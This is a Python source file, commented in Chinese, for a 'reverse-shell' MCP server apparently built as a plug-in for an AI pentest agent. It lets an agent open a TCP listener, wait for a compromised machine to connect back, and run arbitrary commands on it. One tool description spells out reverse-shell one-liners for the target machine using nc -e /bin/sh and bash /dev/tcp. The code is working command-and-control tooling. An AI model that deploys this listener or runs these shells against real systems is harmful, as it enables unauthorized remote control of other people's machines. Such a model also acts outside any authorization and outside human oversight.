#!/usr/bin/env python3
"""
Reverse Shell MCP Server - 反向 Shell MCP 服务

通过 MCP 协议暴露反向 Shell 能力：开启/停止监听、与已连接客户端交互执行命令。
无需修改 CyberStrikeAI 后端，在「设置 → 外部 MCP」中以 stdio 方式添加即可。

依赖：pip install mcp（或使用项目 venv）
运行：python mcp_reverse_shell.py  或  python3 mcp_reverse_shell.py
"""

from __future__ import annotations

import asyncio
import socket
import threading
import time
from typing import Any

from mcp.server.fastmcp import FastMCP

# ---------------------------------------------------------------------------
# 反向 Shell 状态（单例：一个监听器、一个已连接客户端）
# ---------------------------------------------------------------------------

_LISTENER: socket.socket | None = None
_LISTENER_THREAD: threading.Thread | None = None
_LISTENER_PORT: int | None = None
_CLIENT_SOCK: socket.socket | None = None
_CLIENT_ADDR: tuple[str, int] | None = None
_LOCK = threading.Lock()
_STOP_EVENT = threading.Event()
_READY_EVENT = threading.Event()
_LAST_LISTEN_ERROR: str | None = None
_LISTENER_THREAD_JOIN_TIMEOUT = 1.0
_START_READY_TIMEOUT = 1.5

# 用于 send_command 的输出结束标记（避免无限等待）
_END_MARKER = "__RS_DONE__"
_RECV_TIMEOUT = 30.0
_RECV_CHUNK = 4096


def _get_local_ips() -> list[str]:
    """获取本机 IP 列表（供目标机反弹连接用），优先非 127 地址。"""
    ips: list[str] = []
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip and ip != "127.0.0.1":
            ips.append(ip)
    except OSError:
        pass
    if not ips:
        try:
            ip = socket.gethostbyname(socket.gethostname())
            if ip:
                ips.append(ip)
        except OSError:
            pass
    if not ips:
        ips.append("127.0.0.1")
    return ips


def _accept_loop(port: int) -> None:
    """在后台线程中：bind、listen、accept，只接受一个客户端。"""
    global _LISTENER, _CLIENT_SOCK, _CLIENT_ADDR, _LISTENER_PORT, _LAST_LISTEN_ERROR
    sock: socket.socket | None = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", port))
        sock.listen(1)
        # 避免 stop_listener 关闭后 accept() 长时间不返回：用超时轮询检查停止事件
        sock.settimeout(0.5)
        with _LOCK:
            _LISTENER = sock
            _LISTENER_PORT = port
            _LAST_LISTEN_ERROR = None
            _READY_EVENT.set()
        # 循环 accept：只接受一个连接，或等待 stop 事件
        while not _STOP_EVENT.is_set():
            try:
                client, addr = sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            with _LOCK:
                _CLIENT_SOCK = client
                _CLIENT_ADDR = (addr[0], addr[1])
            break
    except OSError as e:
        with _LOCK:
            _LAST_LISTEN_ERROR = str(e)
            _READY_EVENT.set()
    finally:
        with _LOCK:
            _LISTENER = None
            _LISTENER_PORT = None
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


def _start_listener(port: int) -> str:
    global _LISTENER_THREAD, _LISTENER_PORT, _CLIENT_SOCK, _CLIENT_ADDR, _LAST_LISTEN_ERROR
    old_thread: threading.Thread | None = None
    with _LOCK:
        if _LISTENER is not None:
            # _LISTENER_PORT 可能短暂为 None（例如刚 stop/start），因此做个兜底显示
            show_port = _LISTENER_PORT if _LISTENER_PORT is not None else port
            return f"已在监听中（端口: {show_port}），请先 stop_listener 再重新 start。"
        if _CLIENT_SOCK is not None:
            try:
                _CLIENT_SOCK.close()
            except OSError:
                pass
            _CLIENT_SOCK = None
            _CLIENT_ADDR = None
        old_thread = _LISTENER_THREAD

    # 若旧线程还没完全退出，短暂等待一下以减少端口绑定失败概率
    if old_thread is not None and old_thread.is_alive():
        old_thread.join(timeout=0.5)

    _STOP_EVENT.clear()
    _READY_EVENT.clear()
    _LAST_LISTEN_ERROR = None
    th = threading.Thread(target=_accept_loop, args=(port,), daemon=True)
    th.start()
    _LISTENER_THREAD = th

    # 等待后台线程完成 bind/listen（或失败）
    _READY_EVENT.wait(timeout=_START_READY_TIMEOUT)
    with _LOCK:
        err = _LAST_LISTEN_ERROR
        listening = _LISTENER is not None

    if listening:
        ips = _get_local_ips()
        addrs = ", ".join(f"{ip}:{port}" for ip in ips)
        return (
            f"已在 0.0.0.0:{port} 开始监听。"
            f"目标机请反弹到: {addrs}（任选其一）。连接后使用 reverse_shell_send_command 执行命令。"
        )

    if err:
        return f"启动监听失败（0.0.0.0:{port}）：{err}"

    # 仍未准备好：可能线程调度较慢或环境异常；给出可操作的提示
    return f"启动监听未确认成功（0.0.0.0:{port}）。请调用 reverse_shell_status 确认，或稍后重试。"


def _stop_listener() -> str:
    global _LISTENER, _LISTENER_THREAD, _CLIENT_SOCK, _CLIENT_ADDR, _LISTENER_PORT
    listener_sock: socket.socket | None = None
    client_sock: socket.socket | None = None
    old_thread: threading.Thread | None = None
    with _LOCK:
        _STOP_EVENT.set()
        _READY_EVENT.set()
        listener_sock = _LISTENER
        old_thread = _LISTENER_THREAD
        _LISTENER = None
        _LISTENER_PORT = None
        client_sock = _CLIENT_SOCK
        _CLIENT_SOCK = None
        _CLIENT_ADDR = None

    if listener_sock is not None:
        try:
            listener_sock.close()
        except OSError:
            pass
    if client_sock is not None:
        try:
            client_sock.close()
        except OSError:
            pass

    # 等待监听线程退出，避免 stop/start 竞态导致“端口 None 仍提示已在监听中”
    if old_thread is not None and old_thread.is_alive():
        old_thread.join(timeout=_LISTENER_THREAD_JOIN_TIMEOUT)
    with _LOCK:
        _LISTENER_THREAD = None
    return "监听已停止，已断开当前客户端（如有）。"


def _disconnect_client() -> str:
    global _CLIENT_SOCK, _CLIENT_ADDR
    with _LOCK:
        if _CLIENT_SOCK is None:
            return "当前无已连接客户端。"
        try:
            _CLIENT_SOCK.close()
        except OSError:
            pass
        addr = _CLIENT_ADDR
        _CLIENT_SOCK = None
        _CLIENT_ADDR = None
    return f"已断开客户端 {addr}。"


def _status() -> dict[str, Any]:
    with _LOCK:
        listening = _LISTENER is not None
        port = _LISTENER_PORT
        connected = _CLIENT_SOCK is not None
        addr = _CLIENT_ADDR
    connect_back = None
    if listening and port is not None:
        ips = _get_local_ips()
        connect_back = [f"{ip}:{port}" for ip in ips]
    return {
        "listening": listening,
        "port": port,
        "connect_back": connect_back,
        "connected": connected,
        "client_address": f"{addr[0]}:{addr[1]}" if addr else None,
    }


def _send_command_blocking(command: str, timeout: float = _RECV_TIMEOUT) -> str:
    """在同步上下文中向已连接客户端发送命令并读取输出（带结束标记）。"""
    global _CLIENT_SOCK, _CLIENT_ADDR
    with _LOCK:
        client = _CLIENT_SOCK
    if client is None:
        return "错误：当前无已连接客户端。请先 start_listener，等待目标连接后再 send_command。"
    # 使用结束标记以便可靠地截断输出
    wrapped = f"{command.strip()}\necho {_END_MARKER}\n"
    try:
        client.settimeout(timeout)
        client.sendall(wrapped.encode("utf-8", errors="replace"))
        data = b""
        while True:
            try:
                chunk = client.recv(_RECV_CHUNK)
                if not chunk:
                    break
                data += chunk
                if _END_MARKER.encode() in data:
                    break
            except socket.timeout:
                break
        text = data.decode("utf-8", errors="replace")
        if _END_MARKER in text:
            text = text.split(_END_MARKER)[0].strip()
        return text or "(无输出)"
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        with _LOCK:
            if _CLIENT_SOCK is client:
                _CLIENT_SOCK = None
                _CLIENT_ADDR = None
        return f"连接已断开: {e}"
    except Exception as e:
        return f"执行异常: {e}"


# ---------------------------------------------------------------------------
# MCP 服务与工具
# ---------------------------------------------------------------------------

app = FastMCP(
    name="reverse-shell",
    instructions="反向 Shell MCP：在本地开启 TCP 监听，等待目标机连接后通过工具执行命令。",
)


@app.tool(
    description="在指定端口启动反向 Shell 监听。目标机需执行反向连接（如 nc -e /bin/sh YOUR_IP PORT 或 bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1）。仅支持一个监听器与一个客户端。",
)
def reverse_shell_start_listener(port: int) -> str:
    """Start reverse shell listener on the given port (e.g. 4444)."""
    if port < 1 or port > 65535:
        return "端口需在 1–65535 之间。"
    return _start_listener(port)


@app.tool(
    description="停止反向 Shell 监听并断开当前客户端。",
)
def reverse_shell_stop_listener() -> str:
    """Stop the listener and disconnect the current client."""
    return _stop_listener()


@app.tool(
    description="查看当前状态：是否在监听、端口、是否有客户端连接及客户端地址。",
)
def reverse_shell_status() -> str:
    """Get listener and client connection status."""
    s = _status()
    lines = [
        f"监听中: {s['listening']}",
        f"端口: {s['port']}",
        f"反弹地址(目标机连接): {', '.join(s['connect_back']) if s.get('connect_back') else '-'}",
        f"已连接: {s['connected']}",
        f"客户端: {s['client_address'] or '-'}",
    ]
    return "\n".join(lines)


@app.tool(
    description="向已连接的反向 Shell 客户端发送一条命令并返回输出。若无连接请先 start_listener 并等待目标连接。",
)
async def reverse_shell_send_command(command: str) -> str:
    """Send a command to the connected reverse shell client and return output."""
    # 在线程池中执行阻塞的 socket I/O，避免长时间占用 MCP 主线程，使 status/stop_listener 等仍可响应
    return await asyncio.to_thread(_send_command_blocking, command)


@app.tool(
    description="仅断开当前客户端连接，不停止监听（可继续等待新连接）。",
)
def reverse_shell_disconnect() -> str:
    """Disconnect the current client without stopping the listener."""
    return _disconnect_client()


if __name__ == "__main__":
    app.run(transport="stdio")
